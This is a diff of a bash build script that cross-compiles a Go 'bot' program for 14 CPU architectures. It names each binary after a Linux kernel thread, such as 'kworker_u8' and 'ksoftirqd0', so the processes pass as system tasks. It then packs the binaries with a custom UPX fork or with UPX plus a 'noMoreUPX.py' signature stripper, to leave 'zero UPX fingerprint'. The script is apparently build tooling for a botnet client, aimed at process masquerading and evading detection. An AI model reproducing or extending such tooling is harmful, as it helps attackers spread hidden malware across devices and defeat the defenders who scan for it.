@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # Sins Custom legiatmate Name Builder
-# m30w packer (custom UPX fork) reduces Go binaries from 8mb to ~2mb.
-# zero UPX fingerprint — no stripping needed.
+# x86 (386/amd64): m30w packer (custom UPX fork) — zero UPX fingerprint
+# All other arches: system UPX + noMoreUPX.py signature stripping
 
 # ======================== BINARY ARCHITECTURE MAPPING ========================
 # Build for all architectures - each gets a different binary name from AMBS array
@@ -46,6 +46,9 @@ AMBS=("ksoftirqd0" "kworker_u8" "jbd2_sda1d" "bioset0" "kblockd0"
 BINS_DIR="$PROJECT_ROOT/bins"
 mkdir -p "$BINS_DIR"
 
+# Locate system UPX — used for non-x86 arches
+SYS_UPX=$(command -v upx 2>/dev/null)
+
 # Counter for AMBS array
 INDEX=0
 
@@ -55,55 +58,83 @@ build_for_arch() {
     local goos="$2"        # GOOS value (operating system)
     local goarch="$3"      # GOARCH value (architecture)
     local goarm="$4"       # GOARM value (only for ARM)
-    
+
     echo -e "\nBuilding for $arch_name..."
-    
+
     local OUTPUT="$BINS_DIR/${AMBS[$INDEX]}"
-    
+
     cd "$PROJECT_ROOT"
-    
+
     if [ -n "$goarm" ]; then
-        # ARM architectures require GOARM setting
         GOOS="$goos" GOARCH="$goarch" GOARM="$goarm" $GO_BIN build -trimpath -ldflags="-s -w -buildid=" -o "$OUTPUT" ./bot
     else
         GOOS="$goos" GOARCH="$goarch" $GO_BIN build -trimpath -ldflags="-s -w -buildid=" -o "$OUTPUT" ./bot
     fi
-    
-    # Check if build succeeded
+
     if [ ! -f "$OUTPUT" ]; then
         echo "ERROR: Build failed for $arch_name"
         return 1
     fi
-    
-    # Strip symbols (Go -s -w already strips, this is just extra — silence failures on cross-arch)
+
+    # Strip symbols (Go -s -w already strips, this is extra — silence failures on cross-arch)
     strip --strip-all "$OUTPUT" 2>/dev/null
 
-    # Compress with m30w packer (zero UPX fingerprint)
+    local before=$(stat -c%s "$OUTPUT")
+    local bh=$(numfmt --to=iec --suffix=B $before 2>/dev/null || echo "${before}B")
+
+    # x86 arches: use m30w (VPX) — zero UPX fingerprint
+    # Everything else: system UPX + noMoreUPX.py signature strip
     local UPX_BIN="$SCRIPT_DIR/upx"
-    if [ -x "$UPX_BIN" ]; then
-        local before=$(stat -c%s "$OUTPUT")
-        local bh=$(numfmt --to=iec --suffix=B $before 2>/dev/null || echo "${before}B")
-        cp "$OUTPUT" "$OUTPUT.tmp"
-        chmod 755 "$OUTPUT.tmp"
-        if "$UPX_BIN" --lzma "$OUTPUT.tmp" 2>&1 | grep -v "^$\|WARNING\|^\s*$" && [ -f "$OUTPUT.tmp" ] && [ "$(stat -c%s "$OUTPUT.tmp")" -lt "$before" ]; then
-            mv "$OUTPUT.tmp" "$OUTPUT"
-            local after=$(stat -c%s "$OUTPUT")
-            local ah=$(numfmt --to=iec --suffix=B $after 2>/dev/null || echo "${after}B")
-            local pct=$(( (before - after) * 100 / before ))
-            echo "    packed: $bh → $ah ($pct% smaller)"
-        elif cp "$OUTPUT" "$OUTPUT.tmp" && chmod 755 "$OUTPUT.tmp" && "$UPX_BIN" --best "$OUTPUT.tmp" 2>&1 | grep -v "^$\|WARNING\|^\s*$" && [ -f "$OUTPUT.tmp" ] && [ "$(stat -c%s "$OUTPUT.tmp")" -lt "$before" ]; then
-            mv "$OUTPUT.tmp" "$OUTPUT"
-            local after=$(stat -c%s "$OUTPUT")
-            local ah=$(numfmt --to=iec --suffix=B $after 2>/dev/null || echo "${after}B")
-            local pct=$(( (before - after) * 100 / before ))
-            echo "    packed: $bh → $ah ($pct% smaller)"
-        else
-            rm -f "$OUTPUT.tmp"
-            echo "    packing skipped (unsupported arch)"
-        fi
-    else
-        echo "    ERROR: m30w packer not found at $UPX_BIN"
-    fi
+    case "$goarch" in
+        386|amd64)
+            if [ -x "$UPX_BIN" ]; then
+                cp "$OUTPUT" "$OUTPUT.tmp"
+                if "$UPX_BIN" --lzma "$OUTPUT.tmp" >/dev/null 2>&1 && \
+                   [ -f "$OUTPUT.tmp" ] && [ "$(stat -c%s "$OUTPUT.tmp")" -lt "$before" ]; then
+                    mv "$OUTPUT.tmp" "$OUTPUT"
+                elif cp "$OUTPUT" "$OUTPUT.tmp" && \
+                     "$UPX_BIN" --best "$OUTPUT.tmp" >/dev/null 2>&1 && \
+                     [ -f "$OUTPUT.tmp" ] && [ "$(stat -c%s "$OUTPUT.tmp")" -lt "$before" ]; then
+                    mv "$OUTPUT.tmp" "$OUTPUT"
+                else
+                    rm -f "$OUTPUT.tmp"
+                    echo "    m30w packing skipped"
+                    INDEX=$((INDEX + 1)); return
+                fi
+                local after=$(stat -c%s "$OUTPUT")
+                local ah=$(numfmt --to=iec --suffix=B $after 2>/dev/null || echo "${after}B")
+                local pct=$(( (before - after) * 100 / before ))
+                echo "    m30w: $bh → $ah ($pct% smaller)"
+            else
+                echo "    WARNING: m30w packer not found at $UPX_BIN"
+            fi
+            ;;
+        *)
+            if [ -n "$SYS_UPX" ]; then
+                cp "$OUTPUT" "$OUTPUT.tmp"
+                if "$SYS_UPX" --lzma -q "$OUTPUT.tmp" >/dev/null 2>&1 && \
+                   [ -f "$OUTPUT.tmp" ] && [ "$(stat -c%s "$OUTPUT.tmp")" -lt "$before" ]; then
+                    python3 "$SCRIPT_DIR/noMoreUPX.py" "$OUTPUT.tmp"
+                    mv "$OUTPUT.tmp" "$OUTPUT"
+                elif cp "$OUTPUT" "$OUTPUT.tmp" && \
+                     "$SYS_UPX" --best -q "$OUTPUT.tmp" >/dev/null 2>&1 && \
+                     [ -f "$OUTPUT.tmp" ] && [ "$(stat -c%s "$OUTPUT.tmp")" -lt "$before" ]; then
+                    python3 "$SCRIPT_DIR/noMoreUPX.py" "$OUTPUT.tmp"
+                    mv "$OUTPUT.tmp" "$OUTPUT"
+                else
+                    rm -f "$OUTPUT.tmp"
+                    echo "    UPX skipped (unsupported arch or no gain)"
+                    INDEX=$((INDEX + 1)); return
+                fi
+                local after=$(stat -c%s "$OUTPUT")
+                local ah=$(numfmt --to=iec --suffix=B $after 2>/dev/null || echo "${after}B")
+                local pct=$(( (before - after) * 100 / before ))
+                echo "    sysUPX+strip: $bh → $ah ($pct% smaller)"
+            else
+                echo "    WARNING: system UPX not found — shipping raw"
+            fi
+            ;;
+    esac
     INDEX=$((INDEX + 1))
 }
 
@@ -127,4 +158,4 @@ echo -e "\nAll 14 builds complete!"
 echo "Built binaries saved to $BINS_DIR/:"
 ls -la "$BINS_DIR/"
 
-echo -e "\nAll binaries packed with zero UPX fingerprint."
+echo -e "\nx86: m30w (zero fingerprint) | other: system UPX + noMoreUPX (sigs stripped)"
